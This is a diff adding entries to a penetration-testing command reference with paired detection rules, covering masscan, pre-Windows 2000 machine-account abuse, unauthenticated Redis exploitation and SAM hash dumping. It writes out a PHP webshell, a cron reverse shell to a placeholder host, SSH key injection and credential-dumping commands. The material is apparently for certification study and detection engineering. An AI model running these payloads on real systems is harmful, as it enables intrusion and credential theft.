+      ],
+      "recommended": [
+        {
+          "id": "nmap-full-version-scan",
+          "note": "Use nmap for detailed service/version scanning after masscan finds open ports.",
+          "rel": "next"
+        },
+        {
+          "id": "recon-rustscan",
+          "note": "RustScan: another fast scanner that auto-pipes to nmap.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Masscan uses a custom TCP/IP stack with asynchronous SYN scanning. It generates packets directly without OS socket overhead, achieving millions of packets per second.",
+        "prerequisites": "Root/sudo for raw socket access; target IP range.",
+        "impact": "Rapid enumeration of all open ports on target networks.",
+        "detection": "[MITRE T1046] Extremely high volume of SYN packets from single source; incomplete TCP handshakes.",
+        "artifacts": "Firewall logs showing mass SYN traffic; IDS alerts for port scanning; connection rate anomalies.",
+        "splunk_spl": "index=firewall action=allowed\n| stats dc(dest_port) as unique_ports, count by src_ip\n| where unique_ports > 100 OR count > 10000\n| sort -unique_ports",
+        "elastic_kql": "network.transport:\"tcp\" AND event.action:\"connection_attempted\" AND source.ip:<attacker_ip>",
+        "sentinel_kql": "CommonSecurityLog\n| where DeviceAction == \"Allow\"\n| summarize UniquePorts=dcount(DestinationPort), TotalConnections=count() by SourceIP, bin(TimeGenerated, 1m)\n| where UniquePorts > 100 or TotalConnections > 5000",
+        "sigma_rules": "net_firewall_mass_port_scan",
+        "prevention": "Rate-limit incoming connections; IDS/IPS rules for port scanning; network segmentation; block scanning source IPs.",
+        "sources": [
+          "masscan documentation",
+          "https://attack.mitre.org/techniques/T1046/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Mass port scanning activity",
+            "logic": "title: High-Volume Port Scan Detection\nstatus: experimental\nlogsource:\n  category: firewall\ndetection:\n  selection:\n    action: allow\n  timeframe: 1m\n  condition: selection | count(dst_port) by src_ip > 100\nlevel: high",
+            "data_source": "firewall",
+            "attack": [
+              "T1046"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Vulnerability scanners (Nessus, Qualys); authorized penetration testing",
+            "tuning": "Whitelist known scanner IPs; adjust threshold based on network size"
+          }
+        ]
+      }
     },
     {
       "id": "mcrta-methodology",
@@ -119110,6 +120187,106 @@ const COMMAND_DATA = {
       "explain": "Pre-Engagement - Scoping Questions - reference (methodology, not a runnable command).\nCore scoping inputs: # of live hosts; # of IPs/CIDR ranges; # of domains/subdomains; # of wireless SSIDs; # of web/mobile apps; authenticated roles; phishing target count; will client provide the l..."
     },
     {
+      "id": "ad-pre2k-computers",
+      "name": "Pre-Windows 2000 Computer Accounts - Known Password Exploitation",
+      "command": "Get-ADComputer -Filter {PasswordLastSet -lt (Get-Date).AddYears(-1)} -Properties PasswordLastSet, OperatingSystem | Select Name, PasswordLastSet, OperatingSystem",
+      "description": "Computer accounts created with \"Assign this computer account as a pre-Windows 2000 computer\" have their password set to the lowercase machine name (without the trailing $). These accounts can be used for authentication, Kerberoasting across trusts, and RBCD attacks. Shockingly common in legacy environments.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "Credential Access",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "Trustedsec research; AD legacy exploitation",
+      "tags": [
+        "pre2k",
+        "pre-windows-2000",
+        "computer-account",
+        "known-password",
+        "legacy",
+        "machine-account"
+      ],
+      "mitre": [
+        "T1078.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== FIND PRE-2000 ACCOUNTS ===\n  # PowerShell:\n  Get-ADComputer -Filter {PasswordLastSet -lt (Get-Date).AddYears(-5)} -Properties PasswordLastSet | Select Name, PasswordLastSet\n  # Or with userAccountControl flag:\n  Get-ADComputer -Filter {userAccountControl -band 0x20} -Properties userAccountControl\n\n=== DEFAULT PASSWORD ===\n  # Pre-2000 computer accounts use lowercase machine name as password:\n  # Machine: WORKSTATION01$ -> Password: workstation01\n  # Machine: SERVER2$       -> Password: server2\n\n=== AUTHENTICATE ===\n  # From Linux:\n  crackmapexec smb <dc_ip> -u WORKSTATION01$ -p workstation01\n  getTGT.py <domain>/WORKSTATION01$:workstation01\n  # From Windows:\n  runas /netonly /user:<domain>\\WORKSTATION01$ cmd.exe\n  # (enter: workstation01 as password)\n\n=== EXPLOITATION ===\n  # Kerberoast with machine account:\n  GetUserSPNs.py <domain>/WORKSTATION01$:workstation01 -dc-ip <dc_ip>\n  # RBCD if machine has delegation rights:\n  rbcd.py -delegate-to <target>$ -delegate-from WORKSTATION01$ -dc-ip <dc_ip> -action write <domain>/WORKSTATION01$:workstation01\n  # Enum AD:\n  ldapsearch -x -H ldap://<dc_ip> -D \"WORKSTATION01$@<domain>\" -w workstation01 -b \"DC=<domain>,DC=local\"",
+      "examples": [
+        {
+          "label": "Find stale computer accounts",
+          "command": "Get-ADComputer -Filter {PasswordLastSet -lt (Get-Date).AddYears(-1)} -Properties PasswordLastSet | Select Name, PasswordLastSet"
+        },
+        {
+          "label": "Auth with known machine password",
+          "command": "crackmapexec smb 192.168.1.10 -u WORKSTATION01$ -p workstation01"
+        },
+        {
+          "label": "Kerberoast with machine account",
+          "command": "GetUserSPNs.py corp.local/WORKSTATION01$:workstation01 -dc-ip 192.168.1.10"
+        }
+      ],
+      "references": [
+        {
+          "title": "TrustedSec - Pre-2000 Computers",
+          "url": "https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/"
+        },
+        {
+          "title": "MITRE T1078.002",
+          "url": "https://attack.mitre.org/techniques/T1078/002/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-addcomputer",
+          "note": "Machine account creation for RBCD chains; pre-2k accounts provide free machine creds.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-impacket-rbcd",
+          "note": "Use pre-2k machine creds for RBCD delegation attacks.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Pre-Windows 2000 computer accounts are created with a predictable password (lowercase machine name). If the password is never changed after joining the domain, the default credential remains valid.",
+        "prerequisites": "Pre-2000 computer accounts in the domain that never rotated their password.",
+        "impact": "Valid domain computer credentials for enumeration, Kerberoasting, and delegation attacks.",
+        "detection": "[MITRE T1078.002] Authentication from computer accounts with very old password timestamps; unusual logon patterns from machine accounts.",
+        "artifacts": "Event 4624 logon from machine accounts; Kerberos TGT requests from stale computer accounts.",
+        "splunk_spl": "index=windows EventCode=4624 TargetUserName=\"*$\"\n| lookup ad_computers ComputerName as TargetUserName OUTPUT PasswordLastSet\n| where PasswordLastSet < relative_time(now(), \"-365d\")\n| table _time, TargetUserName, IpAddress, PasswordLastSet",
+        "elastic_kql": "event.code:\"4624\" AND user.name:*$",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4624\n| where TargetUserName endswith \"$\"\n| join kind=inner (\n  SecurityEvent | where EventID == 4741 or EventID == 4742\n) on TargetUserName",
+        "sigma_rules": "win_security_pre2k_computer_account_auth",
+        "prevention": "Audit and disable pre-2000 computer accounts; force machine password rotation; remove \"Assign this computer account as a pre-Windows 2000 computer\" from provisioning.",
+        "sources": [
+          "Trustedsec research",
+          "https://attack.mitre.org/techniques/T1078/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Pre-2000 computer account authentication",
+            "logic": "SecurityEvent\n| where EventID == 4624\n| where TargetUserName endswith \"$\"\n| where LogonType in (3, 10)\n| summarize LoginCount=count(), DistinctSources=dcount(IpAddress) by TargetUserName, bin(TimeGenerated, 1h)\n| where LoginCount > 5 or DistinctSources > 2",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4624"
+            ],
+            "attack": [
+              "T1078.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate machine account authentication; service accounts using computer identities",
+            "tuning": "Cross-reference with AD computer password age; alert on accounts with passwords older than 90 days"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "windows",
       "requires": [
@@ -125002,6 +126179,102 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Before loading any offensive PowerShell, checks what defenses are watching so you pick the right bypass:\n  $ExecutionContext.SessionState.LanguageMode   FullLanguage vs ConstrainedLanguage (CLM changes what you can run)\nFollow with whoami /all (privileges/groups), klist (current tickets), Get-AppLockerPolicy -Effective (allow-listing), and Get-MpComputerStatus/Get-MpPreference (Defender status + exclusion paths). Knowing this avoids burning the host with the wrong tool."
+    },
+    {
+      "id": "recon-redis-exploit",
+      "name": "Redis - Unauthenticated Access & RCE",
+      "command": "redis-cli -h <target> INFO",
+      "description": "Redis servers exposed without authentication allow reading/writing data, writing files to disk (webshells, SSH keys, cron jobs), and achieving RCE via Lua scripting or module loading. Default port 6379 is commonly found in internal networks and cloud environments.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Web Exploitation",
+      "subcategory": "Service Exploitation",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "Redis exploitation methodology; HackTricks",
+      "tags": [
+        "redis",
+        "unauthenticated",
+        "rce",
+        "webshell",
+        "ssh-key",
+        "cron",
+        "file-write",
+        "nosql"
+      ],
+      "mitre": [
+        "T1190",
+        "T1505.003"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== ENUMERATION ===\n  redis-cli -h <target> INFO\n  redis-cli -h <target> CONFIG GET *\n  redis-cli -h <target> CLIENT LIST\n  redis-cli -h <target> DBSIZE\n  redis-cli -h <target> KEYS *\n\n=== SSH KEY INJECTION ===\n  ssh-keygen -t rsa -f redis_key\n  (echo -e \"\\n\\n\"; cat redis_key.pub; echo -e \"\\n\\n\") > payload.txt\n  redis-cli -h <target> FLUSHALL\n  cat payload.txt | redis-cli -h <target> -x SET crackit\n  redis-cli -h <target> CONFIG SET dir /root/.ssh/\n  redis-cli -h <target> CONFIG SET dbfilename authorized_keys\n  redis-cli -h <target> SAVE\n  ssh -i redis_key root@<target>\n\n=== WEBSHELL VIA FILE WRITE ===\n  redis-cli -h <target> CONFIG SET dir /var/www/html/\n  redis-cli -h <target> CONFIG SET dbfilename shell.php\n  redis-cli -h <target> SET payload \"<?php system($_GET[cmd]); ?>\"\n  redis-cli -h <target> SAVE\n  curl http://<target>/shell.php?cmd=id\n\n=== CRON JOB RCE ===\n  redis-cli -h <target> CONFIG SET dir /var/spool/cron/\n  redis-cli -h <target> CONFIG SET dbfilename root\n  redis-cli -h <target> SET payload \"\\n* * * * * bash -i >& /dev/tcp/<ip>/<port> 0>&1\\n\"\n  redis-cli -h <target> SAVE\n\n=== MODULE LOADING (Redis >= 4.0) ===\n  # Compile: https://github.com/n0b0dyCN/RedisModules-ExecuteCommand\n  redis-cli -h <target> MODULE LOAD /path/to/module.so\n  redis-cli -h <target> system.exec \"id\"\n\n=== WITH AUTH ===\n  redis-cli -h <target> -a <password> INFO\n  # Default/common passwords: empty, redis, password, admin",
+      "examples": [
+        {
+          "label": "Connect and enumerate",
+          "command": "redis-cli -h 10.10.10.100 INFO"
+        },
+        {
+          "label": "Write SSH key for root access",
+          "command": "redis-cli -h 10.10.10.100 CONFIG SET dir /root/.ssh/"
+        },
+        {
+          "label": "Write webshell to web root",
+          "command": "redis-cli -h 10.10.10.100 CONFIG SET dir /var/www/html/"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks - Redis",
+          "url": "https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis"
+        },
+        {
+          "title": "MITRE T1190 - Exploit Public-Facing Application",
+          "url": "https://attack.mitre.org/techniques/T1190/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "nosql-injection-bypass",
+          "note": "MongoDB NoSQL injection for another NoSQL attack vector.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Redis CONFIG SET allows changing the database file path and name at runtime. By pointing it at sensitive directories and saving, Redis writes its database (containing attacker-controlled data) to arbitrary files.",
+        "prerequisites": "Unauthenticated Redis access (or known password); Redis running as root for SSH key/cron attacks.",
+        "impact": "Remote code execution; SSH key injection for persistent access; webshell deployment; data exfiltration.",
+        "detection": "[MITRE T1190] Redis CONFIG SET to sensitive directories; file writes to .ssh/cron/web directories; unauthorized Redis connections.",
+        "artifacts": "Redis dump files in unusual locations; authorized_keys with Redis header bytes; webshells with Redis artifacts; cron entries with reverse shells.",
+        "splunk_spl": "index=linux (sourcetype=redis OR sourcetype=syslog) (\"CONFIG SET dir\" OR \"CONFIG SET dbfilename\" OR \"MODULE LOAD\")\n| table _time, host, message",
+        "elastic_kql": "process.name:\"redis-cli\" OR (message:*CONFIG* AND message:*SET* AND message:*dir*)",
+        "sentinel_kql": "Syslog\n| where SyslogMessage has_any (\"CONFIG SET dir\", \"CONFIG SET dbfilename\", \"MODULE LOAD\")\n| project TimeGenerated, HostName, SyslogMessage",
+        "sigma_rules": "linux_redis_exploitation_config_change",
+        "prevention": "Require authentication (requirepass); bind to localhost only; disable dangerous commands (CONFIG, FLUSHALL, MODULE); run Redis as non-root; use Redis ACLs (v6+).",
+        "sources": [
+          "HackTricks Redis",
+          "https://attack.mitre.org/techniques/T1190/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Redis exploitation - CONFIG SET to sensitive directory",
+            "logic": "title: Redis CONFIG SET File Write Exploitation\nstatus: experimental\nlogsource:\n  product: linux\n  service: syslog\ndetection:\n  selection:\n    message|contains|all:\n      - \"CONFIG\"\n      - \"SET\"\n      - \"dir\"\n    message|contains:\n      - \"/root/.ssh\"\n      - \"/var/www\"\n      - \"/var/spool/cron\"\n      - \"/etc/cron\"\n  condition: selection\nlevel: critical",
+            "data_source": "linux-syslog",
+            "attack": [
+              "T1190",
+              "T1505.003"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate Redis configuration changes by administrators",
+            "tuning": "Any CONFIG SET dir pointing to SSH/web/cron directories is almost certainly malicious"
+          }
+        ]
+      }
     },
     {
       "type": "reference",
@@ -132455,6 +133728,104 @@ const COMMAND_DATA = {
             "confidence": "high",
             "false_positives": "Legitimate constrained delegation (e.g., IIS to SQL); front-end/back-end service chains",
             "tuning": "Baseline normal delegation patterns; alert on admin impersonation through delegation"
+          }
+        ]
+      }
+    },
+    {
+      "id": "privesc-sam-dump",
+      "name": "SAM Database Dump - Local Account Hash Extraction",
+      "command": "reg save HKLM\\SAM C:\\temp\\SAM && reg save HKLM\\SYSTEM C:\\temp\\SYSTEM",
+      "description": "The SAM (Security Account Manager) database stores local user password hashes. With SYSTEM/admin access, dump the SAM and SYSTEM registry hives, then extract NTLM hashes offline with secretsdump, samdump2, or mimikatz. Critical for local account credential extraction and lateral movement via password reuse.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Post-Exploitation",
+      "subcategory": "Credential Access",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "Windows internals; OSCP credential access",
+      "tags": [
+        "sam",
+        "registry",
+        "ntlm",
+        "hash-dump",
+        "credential-access",
+        "local-accounts",
+        "reg-save"
+      ],
+      "mitre": [
+        "T1003.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== METHOD 1: REG SAVE (most common) ===\n  reg save HKLM\\SAM C:\\temp\\SAM\n  reg save HKLM\\SYSTEM C:\\temp\\SYSTEM\n  # Transfer to attacker, then:\n  secretsdump.py -sam SAM -system SYSTEM LOCAL\n  # Or: samdump2 SYSTEM SAM\n\n=== METHOD 2: VOLUME SHADOW COPY ===\n  vssadmin create shadow /for=C:\n  copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\temp\\SAM\n  copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\SYSTEM\n\n=== METHOD 3: MIMIKATZ ===\n  mimikatz# token::elevate\n  mimikatz# lsadump::sam\n\n=== METHOD 4: CRACKMAPEXEC ===\n  crackmapexec smb <target> -u admin -p Password123 --sam\n\n=== METHOD 5: IMPACKET (remote) ===\n  secretsdump.py <domain>/<user>:<pass>@<target>\n  # Dumps SAM, LSA, and cached credentials\n\n=== OFFLINE CRACKING ===\n  hashcat -m 1000 hashes.txt wordlist.txt    # NTLM\n  john --format=nt hashes.txt --wordlist=wordlist.txt",
+      "examples": [
+        {
+          "label": "Dump SAM and SYSTEM hives",
+          "command": "reg save HKLM\\SAM C:\\temp\\SAM && reg save HKLM\\SYSTEM C:\\temp\\SYSTEM"
+        },
+        {
+          "label": "Extract hashes offline",
+          "command": "secretsdump.py -sam SAM -system SYSTEM LOCAL"
+        },
+        {
+          "label": "Remote SAM dump via CrackMapExec",
+          "command": "crackmapexec smb 10.10.10.100 -u admin -p Password123 --sam"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1003.002 - SAM",
+          "url": "https://attack.mitre.org/techniques/T1003/002/"
+        },
+        {
+          "title": "Impacket secretsdump",
+          "url": "https://github.com/fortra/impacket"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "secretsdump-ntds",
+          "note": "NTDS.dit dump for domain account hashes (SAM is local only).",
+          "rel": "next"
+        },
+        {
+          "id": "pth-mimikatz",
+          "note": "Use dumped NTLM hashes for pass-the-hash.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The SAM database stores NTLM hashes for local accounts. With SYSTEM privileges, the hives can be exported via reg save or volume shadow copies and parsed offline.",
+        "prerequisites": "SYSTEM or local administrator access on the target.",
+        "impact": "Local account NTLM hashes; enables pass-the-hash and credential reuse across machines.",
+        "detection": "[MITRE T1003.002] Registry hive access to SAM/SYSTEM; reg.exe save commands; VSS creation.",
+        "artifacts": "Event 4688 with reg.exe save; SAM/SYSTEM files in temp directories; VSS creation events.",
+        "splunk_spl": "index=windows EventCode=4688 (CommandLine=\"*reg*save*SAM*\" OR CommandLine=\"*reg*save*SYSTEM*\" OR CommandLine=\"*vssadmin*create*shadow*\")\n| table _time, SubjectUserName, NewProcessName, CommandLine",
+        "elastic_kql": "process.name:\"reg.exe\" AND process.args:(\"save\" AND (\"SAM\" OR \"SYSTEM\" OR \"SECURITY\"))",
+        "sentinel_kql": "DeviceProcessEvents\n| where FileName == \"reg.exe\"\n| where ProcessCommandLine has_all (\"save\", \"SAM\") or ProcessCommandLine has_all (\"save\", \"SYSTEM\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma_rules": "win_process_creation_sam_dump_reg_save",
+        "prevention": "Monitor reg.exe save operations; restrict local admin access; use LAPS for unique local passwords; disable VSS for non-backup users.",
+        "sources": [
+          "OSCP methodology",
+          "https://attack.mitre.org/techniques/T1003/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "SAM/SYSTEM registry hive export",
+            "logic": "DeviceProcessEvents\n| where FileName == \"reg.exe\"\n| where ProcessCommandLine has \"save\" and ProcessCommandLine has_any (\"SAM\", \"SYSTEM\", \"SECURITY\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1003.002"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Legitimate backup scripts; disaster recovery operations",
+            "tuning": "Alert on any non-backup service account; correlate with lateral movement indicators"
           }
         ]
       }
@@ -184313,8 +185684,8 @@ const COMMAND_DATA = {
       }
     }
   ],
-  "totalCommands": 1020,
-  "buildDate": "2026-11-10T13:49:07.775Z",
+  "totalCommands": 1034,
+  "buildDate": "2026-11-10T14:01:07.320Z",
   "certifications": [
     "CDSA",
     "CPTS",
